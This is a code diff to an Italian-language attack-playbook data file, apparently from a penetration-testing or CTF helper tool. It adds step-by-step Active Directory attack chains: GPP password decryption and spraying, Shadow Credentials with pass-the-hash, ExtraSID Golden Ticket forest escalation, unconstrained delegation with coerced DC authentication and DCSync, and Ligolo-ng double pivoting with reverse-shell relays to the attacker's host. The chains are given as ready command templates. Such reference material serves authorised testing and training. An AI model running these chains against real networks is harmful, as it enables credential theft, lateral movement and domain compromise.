@@ -652,6 +652,103 @@ const CHAINS = [
     ]
   },
   {
+    "id": "gpp-spray-foothold",
+    "name": "GPP/SYSVOL → Spray → Foothold",
+    "short": "gpp",
+    "category": "active-directory",
+    "subcategory": "initial-access",
+    "tactic": "Credential Access",
+    "difficulty": "easy",
+    "estTime": "15 min",
+    "objective": "Recuperi una password lasciata nei Group Policy Preferences dentro la share SYSVOL, la decifri (la chiave AES è pubblica) e la riusi in spray sul dominio per ottenere il primo foothold. È uno dei percorsi più comuni quando si parte da una sessione null/anonima.",
+    "outcome": "Credenziali di dominio valide e una shell su un host",
+    "prereqs": [
+      "Accesso in lettura alla share SYSVOL (spesso basta una sessione null o un utente qualsiasi)"
+    ],
+    "mitre": [
+      "T1552.006",
+      "T1110.003"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Recupera le credenziali dai GPP",
+        "cmdRef": "nxc-smb-gpp",
+        "variant": "gpp",
+        "verify": "Il modulo stampa `Found credentials` con username e password già decifrata. Se invece hai trovato tu un `cpassword` dentro un `Groups.xml` sulla SYSVOL, decifralo a mano con `gpp-decrypt <cpassword>`."
+      },
+      {
+        "id": "s2",
+        "title": "Controlla la lockout policy",
+        "cmdRef": "nxc-smb-passpol",
+        "verify": "Leggi `Account Lockout Threshold` prima di spruzzare: se è basso (es. 3-5) usa una sola password per giro per non bloccare gli account."
+      },
+      {
+        "id": "s3",
+        "title": "Spray della credenziale sul dominio",
+        "cmdRef": "nxc-smb-spray",
+        "variant": "default",
+        "verify": "Un `[+]` (o `(Pwn3d!)` se l'utente è admin locale) segnala dove la coppia trovata è valida. La stessa password è spesso riusata da più account."
+      },
+      {
+        "id": "s4",
+        "title": "Apri la shell",
+        "cmdRef": "nxc-winrm",
+        "variant": "default",
+        "verify": "`whoami` conferma l'accesso come l'utente compromesso. Se WinRM è chiuso, prova psexec/wmiexec o RDP."
+      }
+    ]
+  },
+  {
+    "id": "shadowcred-pth",
+    "name": "Shadow Credentials → NT hash → PtH",
+    "short": "shadow",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "tactic": "Privilege Escalation",
+    "difficulty": "medium",
+    "estTime": "15 min",
+    "objective": "Da un diritto di scrittura (GenericWrite/GenericAll) su un utente o computer, aggiungi una Shadow Credential nell'attributo msDS-KeyCredentialLink, autentichi via PKINIT e ne ricavi l'NT hash. Il tutto senza resettare la password del target, quindi in modo non distruttivo e reversibile.",
+    "outcome": "NT hash del target, riusabile in Pass-the-Hash",
+    "prereqs": [
+      "Edge GenericWrite/GenericAll/AddKeyCredentialLink sul target (da BloodHound)",
+      "ADCS o comunque PKINIT abilitato nel dominio"
+    ],
+    "mitre": [
+      "T1552.004",
+      "T1550.002"
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Conferma l'edge di scrittura",
+        "cmdRef": "bloodhound-py",
+        "verify": "In BloodHound il tuo utente ha un edge `GenericWrite`, `GenericAll` o `AddKeyCredentialLink` verso il target. Senza quel diritto la scrittura di msDS-KeyCredentialLink fallisce."
+      },
+      {
+        "id": "s2",
+        "title": "Aggiungi la Shadow Credential e recupera l'hash",
+        "cmdRef": "shadow-creds",
+        "variant": "default",
+        "verify": "`certipy-ad shadow auto` stampa `Got hash for ...` con l'NT hash del target, poi rimuove da sé la KeyCredential aggiunta. È preferibile al reset password perché non rompe il login del legittimo utente."
+      },
+      {
+        "id": "s3",
+        "title": "Valida l'hash e trova dove è admin",
+        "cmdRef": "nxc-pth",
+        "variant": "default",
+        "verify": "Un `(Pwn3d!)` indica gli host su cui l'hash dà privilegi amministrativi, pronti per il movimento laterale."
+      },
+      {
+        "id": "s4",
+        "title": "Apri la shell con l'hash",
+        "cmdRef": "evil-winrm",
+        "variant": "hash",
+        "verify": "`whoami` conferma l'accesso come il target impersonato, usando l'hash al posto della password."
+      }
+    ]
+  },
+  {
     "id": "child-to-parent-extrasid",
     "name": "Child → Parent (ExtraSID)",
     "short": "extrasid",
@@ -673,18 +770,57 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "title": "Enumera il trust e ricava i SID",
+        "cmd": {
+          "name": "Trust + SID (child / parent)",
+          "description": "Prima di forgiare il ticket servono due SID: quello del dominio child (per `-domain-sid`) e quello del parent, il cui gruppo Enterprise Admins è `<SID_parent>-519`. Va anche confermato che il trust sia interno al forest, altrimenti il SID filtering scarta l'ExtraSID.",
+          "template": "# da Windows (PowerView):\nGet-DomainSID\nGet-DomainSID -Domain <parentdomain>\nGet-DomainTrust\n# da Linux (Impacket):\nimpacket-lookupsid <childdomain>/<user>:'<password>'@<parentdc>",
+          "params": [
+            {
+              "key": "parentdomain",
+              "label": "Parent domain",
+              "placeholder": "corp.local"
+            },
+            {
+              "key": "childdomain",
+              "label": "Child domain",
+              "placeholder": "child.corp.local"
+            },
+            {
+              "key": "user",
+              "label": "User",
+              "ctx": "user",
+              "placeholder": "childadmin"
+            },
+            {
+              "key": "password",
+              "label": "Password",
+              "ctx": "password",
+              "placeholder": "P@ssw0rd"
+            },
+            {
+              "key": "parentdc",
+              "label": "Parent DC",
+              "placeholder": "10.10.10.5"
+            }
+          ]
+        },
+        "verify": "Ottieni il SID del child e quello del parent (Enterprise Admins = `<SID_parent>-519`). `Get-DomainTrust` deve mostrare la relazione `WITHIN_FOREST`: solo così l'ExtraSID non viene filtrato."
+      },
+      {
+        "id": "s2",
         "verify": "Il dump riporta la riga `krbtgt:502:` con l'hash NT necessario a forgiare il ticket.",
         "title": "Dump del krbtgt del child",
         "cmdRef": "dcsync"
       },
       {
-        "id": "s2",
+        "id": "s3",
         "verify": "`Saving ticket in hacker.ccache`. Il SID del dominio padre va indicato con il suffisso `-519`, che identifica il gruppo Enterprise Admins.",
         "title": "Forgia il Golden Ticket con ExtraSID",
         "cmdRef": "trust-extrasid"
       },
       {
-        "id": "s3",
+        "id": "s4",
         "verify": "La shell si apre sul domain controller del dominio padre e `whoami /groups` mostra l'appartenenza a Enterprise Admins.",
         "title": "Accedi al parent DC",
         "cmdRef": "psexec"
@@ -714,18 +850,48 @@ const CHAINS = [
     "steps": [
       {
         "id": "s1",
+        "title": "Conferma la delega non vincolata",
+        "cmd": {
+          "name": "Find unconstrained delegation",
+          "description": "Verifica quali computer hanno il flag TRUSTED_FOR_DELEGATION. Il vettore è percorribile solo se hai (o ottieni) SYSTEM su uno di questi, perché è lì che finiranno i TGT catturati.",
+          "template": "nxc ldap <ip> -u '<user>' -p '<password>' --find-delegation\n# oppure da Windows (PowerView):\nGet-DomainComputer -Unconstrained | select dnshostname",
+          "params": [
+            {
+              "key": "ip",
+              "label": "DC IP",
+              "ctx": "ip",
+              "placeholder": "10.10.10.11"
+            },
+            {
+              "key": "user",
+              "label": "User",
+              "ctx": "user",
+              "placeholder": "jdoe"
+            },
+            {
+              "key": "password",
+              "label": "Password",
+              "ctx": "password",
+              "placeholder": "P@ssw0rd"
+            }
+          ]
+        },
+        "verify": "Un computer compare con delega `Unconstrained`. Se è quello su cui controlli SYSTEM, si può procedere alla cattura dei TGT."
+      },
+      {
+        "id": "s2",
         "verify": "Il monitor resta in ascolto e stampa i TGT via via che finiscono nella cache della macchina con delega non vincolata.",
         "title": "Monitora i TGT in arrivo",
         "cmdRef": "unconstrained-deleg"
       },
       {
-        "id": "s2",
+        "id": "s3",
         "verify": "`Authenticating against … SUCCEED` e sul monitor compare il TGT del computer account del domain controller.",
         "title": "Forza il DC ad autenticarsi",
         "cmdRef": "coercer"
       },
       {
-        "id": "s3",
+        "id": "s4",
         "verify": "Con il TGT del DC iniettato in `KRB5CCNAME`, il dump degli hash di dominio va a buon fine partendo da `Administrator:500:`.",
         "title": "Inietta il TGT del DC$ e fai DCSync",
         "cmdRef": "dcsync"
@@ -847,6 +1013,16 @@ const CHAINS = [
       "T1090",
       "T1572"
     ],
+    "refs": [
+      {
+        "label": "Guide to Pivoting using Ligolo-ng — Medium",
+        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
+      },
+      {
+        "label": "Ligolo-ng — repo ufficiale",
+        "url": "https://github.com/nicocha30/ligolo-ng"
+      }
+    ],
     "steps": [
       {
         "id": "s1",
@@ -900,7 +1076,6 @@ const CHAINS = [
             {
               "key": "ip_attacker",
               "label": "IP attacker",
-              "ctx": "ip",
               "placeholder": "10.10.14.5"
             }
           ]
@@ -930,6 +1105,208 @@ const CHAINS = [
               "key": "internal_net",
               "label": "Rete interna",
               "placeholder": "172.16.119.0/24"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "ligolo-double-pivot",
+    "name": "Doppio pivoting con Ligolo-ng",
+    "short": "ligolo2",
+    "category": "lateral",
+    "subcategory": "pivoting",
+    "tactic": "Lateral Movement",
+    "difficulty": "hard",
+    "estTime": "15 min",
+    "objective": "Raggiungere una seconda rete interna che tocca solo il secondo ponte, incatenando due agent Ligolo. Sul primo agent si apre un listener che rilancia le connessioni verso il proxy sulla Kali, il secondo ponte si collega a quel listener e riceve un'interfaccia tun dedicata, così i due tunnel restano attivi insieme senza proxychains.",
+    "outcome": "Seconda rete interna raggiungibile da Kali sull'interfaccia ligolo2",
+    "prereqs": [
+      "Primo pivot Ligolo già attivo (playbook Pivoting con Ligolo-ng)",
+      "Shell sul secondo ponte, dual-homed fra prima e seconda rete interna",
+      "Binario agent per il sistema del secondo ponte",
+      "Firewall locale del primo ponte apribile sulla porta del relay (ufw e simili)"
+    ],
+    "mitre": [
+      "T1090",
+      "T1572"
+    ],
+    "refs": [
+      {
+        "label": "Guide to Pivoting using Ligolo-ng — Medium",
+        "url": "https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16"
+      },
+      {
+        "label": "Ligolo-ng — repo ufficiale",
+        "url": "https://github.com/nicocha30/ligolo-ng"
+      }
+    ],
+    "steps": [
+      {
+        "id": "s1",
+        "verify": "`listener_list` mostra il listener attivo sulla porta scelta del primo ponte; da una shell sul secondo ponte un `nc -vz <ip_ponte1> 11602` risponde aperto.",
+        "title": "Listener relay sul primo ponte (sessione agent 1)",
+        "cmd": {
+          "name": "Ligolo — listener_add sul ponte 1",
+          "description": "Il secondo ponte non ha rotta verso l'IP VPN della Kali, quindi il primo agent fa da relay. Attenzione ai due indirizzi: `--addr` è la porta in ascolto sull'agent, mentre `--to` viene aperto dalla Kali, dove gira il proxy. La porta 11602 evita confusione con la 11601 che il primo agent usa già in uscita.",
+          "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
+          "params": [
+            {
+              "key": "kali_ip",
+              "label": "IP VPN Kali",
+              "placeholder": "10.10.16.72"
+            }
+          ],
+          "variants": [
+            {
+              "id": "kali-ip",
+              "label": "Verso IP Kali",
+              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to <kali_ip>:11601 --tcp\nlistener_list\n\n# se il ponte ha un firewall locale, la porta va aperta:\nufw allow 11602/tcp",
+              "description": "Forma esplicita: la Kali apre la connessione verso il proprio IP VPN. Funziona sia con il proxy in ascolto su tutte le interfacce sia con il proxy legato al solo IP della VPN."
+            },
+            {
+              "id": "loopback",
+              "label": "Verso loopback",
+              "template": "# nella console ligolo-ng, sessione del primo agent:\nlistener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp\nlistener_list",
+              "description": "Forma della documentazione ufficiale: il proxy viene raggiunto sul loopback della Kali. Vale solo se il proxy è in ascolto su 0.0.0.0, come fa `ligolo-ng -selfcert` senza `-laddr`; con un bind sul solo IP VPN la connessione viene rifiutata."
+            }
+          ]
+        }
+      },
+      {
+        "id": "s2",
+        "verify": "L'agent è presente sul secondo ponte ed è eseguibile.",
+        "title": "Porta l'agent sul secondo ponte",
+        "variant": "linux",
+        "cmd": {
+          "name": "Trasferimento agent sul ponte 2",
+          "description": "Il primo tunnel rende la rete interna raggiungibile dalla Kali come una rete locale, quindi la copia parte direttamente dall'attacker verso l'IP interno del secondo ponte. La scelta del canale dipende da cosa espone il ponte: SSH, WinRM oppure un server HTTP sulla Kali con un download lanciato dalla shell.",
+          "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
+          "params": [
+            {
+              "key": "agent",
+              "label": "Path agent",
+              "placeholder": "./agent"
+            },
+            {
+              "key": "user",
+              "label": "User ponte 2",
+              "ctx": "user",
+              "placeholder": "svc-app"
+            },
+            {
+              "key": "pivot2",
+              "label": "IP interno ponte 2",
+              "placeholder": "172.16.139.3"
+            },
+            {
+              "key": "hash",
+              "label": "NT hash",
+              "ctx": "hash",
+              "placeholder": "e7d499a2cd11b1ba3875a60812e21894"
+            }
+          ],
+          "variants": [
+            {
+              "id": "linux",
+              "label": "Linux — scp",
+              "template": "scp <agent> <user>@<pivot2>:/tmp\n\n# poi dalla shell sul ponte 2:\nchmod +x /tmp/agent",
+              "description": "Copia via SSH attraverso il primo tunnel, poi bit di esecuzione sul file."
+            },
+            {
+              "id": "windows",
+              "label": "Windows — evil-winrm",
+              "template": "evil-winrm -i <pivot2> -u <user> -H <hash>\n\n# dalla sessione evil-winrm:\nupload ./agent.exe C:\\\\Windows\\\\Temp\\\\agent.exe",
+              "description": "Su un ponte Windows l'agent viene caricato dalla sessione evil-winrm, con password o pass-the-hash."
+            }
+          ]
+        }
+      },
+      {
+        "id": "s3",
+        "verify": "Nella console del proxy compare un secondo `Agent joined` e `session` elenca ora due agent distinti.",
+        "title": "Connetti il secondo agent al listener",
+        "variant": "linux",
+        "cmd": {
+          "name": "Ligolo — agent 2 verso il ponte 1",
+          "description": "L'agent sul secondo ponte non punta alla Kali ma all'IP interno del primo ponte, sulla porta del relay. La connessione risale il primo tunnel, il proxy la registra come nuova sessione. Il flag `-ignore-cert` serve finché il proxy gira con certificati autofirmati.",
+          "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
+          "params": [
+            {
+              "key": "pivot1_internal",
+              "label": "IP interno ponte 1",
+              "placeholder": "172.16.139.10"
+            }
+          ],
+          "variants": [
+            {
+              "id": "linux",
+              "label": "Linux",
+              "template": "# sul ponte 2, verso l'IP interno del ponte 1:\n./agent -connect <pivot1_internal>:11602 -ignore-cert",
+              "description": "Da lanciare in background o sotto `nohup` se la shell è instabile."
+            },
+            {
+              "id": "windows",
+              "label": "Windows",
+              "template": "C:\\Windows\\Temp\\agent.exe -connect <pivot1_internal>:11602 -ignore-cert",
+              "description": "Stessa connessione dal ponte Windows, lanciata dalla sessione evil-winrm o da una shell remota."
+            }
+          ]
+        }
+      },
+      {
+        "id": "s4",
+        "verify": "`ip addr` elenca sia `ligolo` sia `ligolo2`; la seconda resta DOWN finché il tunnel non parte.",
+        "title": "Crea la seconda interfaccia TUN (Kali)",
+        "cmd": {
+          "name": "Ligolo — interfaccia ligolo2",
+          "description": "Ogni tunnel vuole la sua interfaccia: la prima resta dedicata al ponte 1, la seconda al ponte 2. Senza interfaccia separata il secondo tunnel ruberebbe quella della prima sessione. Dalla versione 0.6 la stessa cosa si fa dalla console con `interface_create --name ligolo2`.",
+          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up",
+          "params": []
+        }
+      },
+      {
+        "id": "s5",
+        "verify": "Il prompt riporta il contesto del secondo agent e `ifconfig` mostra una subnet assente sul primo ponte.",
+        "title": "Seleziona la sessione del secondo agent",
+        "cmd": {
+          "name": "Ligolo — session sul ponte 2",
+          "description": "Con `session` si passa alla sessione del secondo agent, poi `ifconfig` elenca le sue interfacce: quella che non compariva sul primo ponte è la rete da raggiungere. La subnet letta qui è il valore da usare nella route dello step successivo.",
+          "template": "session\nifconfig",
+          "params": []
+        }
+      },
+      {
+        "id": "s6",
+        "verify": "`tunnel_list` mostra due sessioni Online, una su `ligolo` e una su `ligolo2`, e gli host della seconda rete rispondono da Kali mentre il primo tunnel resta operativo.",
+        "title": "Avvia il secondo tunnel e aggiungi la route",
+        "cmd": {
+          "name": "Ligolo — tunnel_start su ligolo2",
+          "description": "Il tunnel parte legandosi all'interfaccia dedicata invece che alla prima, poi la route manda il traffico della seconda rete dentro quell'interfaccia. Da qui i tool girano dalla Kali contro la rete profonda come se fosse locale. Sulle versioni precedenti alla 0.6 il comando è `start --tun ligolo2`.",
+          "template": "# nella sessione del secondo agent:\ntunnel_start --tun ligolo2\ntunnel_list\n\n# sulla Kali, <internal_net2> nel formato x.x.x.x/xx:\nsudo ip route add <internal_net2> dev ligolo2",
+          "params": [
+            {
+              "key": "internal_net2",
+              "label": "Seconda rete interna",
+              "placeholder": "172.16.210.0/24"
+            }
+          ]
+        }
+      },
+      {
+        "id": "s7",
+        "verify": "La shell dalla rete profonda arriva sul listener locale della Kali senza che il target veda mai l'IP VPN dell'attacker.",
+        "title": "Rientro delle reverse shell dalla rete profonda",
+        "cmd": {
+          "name": "Ligolo — listener per reverse shell",
+          "description": "Gli host della seconda rete non raggiungono la Kali, quindi il payload punta all'IP del secondo ponte. Un listener sulla sessione dell'agent 2 rilancia quella porta verso la Kali, dove `nc` o l'handler Metasploit aspettano. Anche qui il firewall locale del ponte va aperto sulla stessa porta.",
+          "template": "# nella sessione del secondo agent:\nlistener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp\n\n# sulla Kali:\nnc -lvnp <port>",
+          "params": [
+            {
+              "key": "port",
+              "label": "Porta reverse",
+              "placeholder": "4444"
             }
           ]
         }
@@ -1292,34 +1669,19 @@ const CHAINS = [
       },
       {
         "id": "s2",
-        "title": "PrintSpoofer su Windows 10 e Server 2016-2019",
+        "title": "Ottieni SYSTEM (scegli il tool dai tab)",
         "cmdRef": "printspoofer",
-        "variant": "default",
-        "verify": "`whoami` restituisce `nt authority\\system` nella nuova shell."
+        "verify": "`whoami` restituisce `nt authority\\system` nella nuova shell. Il tool si sceglie in base alla versione di Windows: PrintSpoofer su Win10 e Server 2016-2019, GodPotato da Server 2012 a 2022 (scelta sicura quando la versione è incerta), JuicyPotatoNG come ripiego per configurazioni COM particolari."
       },
       {
         "id": "s3",
-        "title": "GodPotato per la copertura più ampia",
-        "cmdRef": "printspoofer",
-        "variant": "godpotato",
-        "verify": "Funziona da Server 2012 fino a Server 2022, quindi è la scelta quando la versione non è certa."
-      },
-      {
-        "id": "s4",
-        "title": "JuicyPotatoNG come ripiego",
-        "cmdRef": "printspoofer",
-        "variant": "juicyng",
-        "verify": "Da tentare quando gli altri falliscono, tipicamente per versioni o configurazioni COM particolari."
-      },
-      {
-        "id": "s5",
         "title": "Dump delle credenziali locali",
         "cmdRef": "secretsdump",
         "variant": "local",
         "verify": "Compaiono gli hash di SAM a partire da `Administrator:500:`, più eventuali segreti LSA e password di servizio in chiaro."
       },
       {
-        "id": "s6",
+        "id": "s4",
         "title": "Riuso dell'hash sugli altri host",
         "cmdRef": "nxc-pth",
         "variant": "default",
